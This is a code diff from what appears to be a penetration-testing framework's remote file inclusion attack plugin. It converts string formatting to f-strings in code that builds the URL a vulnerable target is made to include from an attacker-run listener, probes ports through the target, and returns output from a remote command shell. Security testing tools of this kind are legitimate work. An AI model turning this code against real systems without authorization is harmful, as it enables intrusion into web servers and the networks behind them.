@@ -306,10 +306,8 @@ class rfi(AttackPlugin):
             except:
                 raise BaseFrameworkException("Could not create file in webroot.")
             else:
-                url_to_include = "http://%s:%s/%s" % (
-                    self._listen_address,
-                    self._listen_port,
-                    filename,
+                url_to_include = (
+                    f"http://{self._listen_address}:{self._listen_port}/{filename}"
                 )
                 return url_to_include
 
@@ -411,14 +409,14 @@ class PortScanShell(Shell):
         :return: True if the host:port is open.
         """
         mutant = self._exploit_mutant.copy()
-        mutant.set_token_value("http://%s:%s/" % (host, port))
+        mutant.set_token_value(f"http://{host}:{port}/")
 
         try:
             http_response = self._uri_opener.send_mutant(mutant)
         except BaseFrameworkException as w3:
-            return 'Exception from the remote web application: "%s"' % w3
+            return f'Exception from the remote web application: "{w3}"'
         except Exception as e:
-            return 'Unhandled exception, "%s"' % e
+            return f'Unhandled exception, "{e}"'
         else:
             if "HTTP request failed!" in http_response.get_body():
                 # The port is open but it's not an HTTP daemon
@@ -501,9 +499,9 @@ class RFIShell(ExecShell, PortScanShell):
         try:
             http_res = self._uri_opener.send_mutant(mutant)
         except BaseFrameworkException as w3:
-            return 'Exception from the remote web application: "%s"' % w3
+            return f'Exception from the remote web application: "{w3}"'
         except Exception as e:
-            return 'Unhandled exception from the remote web application: "%s"' % e
+            return f'Unhandled exception from the remote web application: "{e}"'
         else:
             return shell_handler.extract_result(http_res.get_body())
 
